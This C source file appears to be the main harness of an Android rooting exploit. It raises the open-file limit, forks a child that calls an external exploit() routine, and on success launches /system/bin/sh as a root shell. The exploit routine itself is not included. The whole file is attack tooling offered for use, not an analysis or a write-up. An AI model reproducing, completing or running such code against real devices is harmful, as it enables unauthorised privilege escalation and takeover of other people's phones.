#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include "log.h"
#include <sys/resource.h>

int exploit();

static int setfdlimit()
{
	struct rlimit rlim;
	int ret;
	if ((ret = getrlimit(RLIMIT_NOFILE, &rlim)))
	{
		perror("getrlimit()");
		return ret;
	}

	printf("[+] Changing fd limit from %lu to %lu\n", rlim.rlim_cur, rlim.rlim_max);
	rlim.rlim_cur = rlim.rlim_max;
	if((ret = setrlimit(RLIMIT_NOFILE, &rlim)))
		perror("setrlimit()");

	return ret;
}


int main(int argc, char **argv){
	int i;
	int rc;
	void *thread_retval;
	int retry;
    pid_t pid;
    
    setbuf(stdout, NULL);


    setfdlimit(); 
    LOGD("[+] <main> parent pid = %d", getpid());

    pid = fork();
    if(0 == pid){
        LOGD("[+] <main> child pid = %d", getpid());
        //setsid();
        if( 0 == exploit()){
            LOGD("[+] <main> root success");
            system("/system/bin/sh");
        }else{
            LOGD("[+] <main> root fail");
        } 
        /*
        while(1){
            sleep(60*60);
        }*/
        //sleep(10);
        return 0;
    }
    //sleep(5);
    waitpid(pid);
    LOGD("[+] <main> parent exit");

	return 0;
}
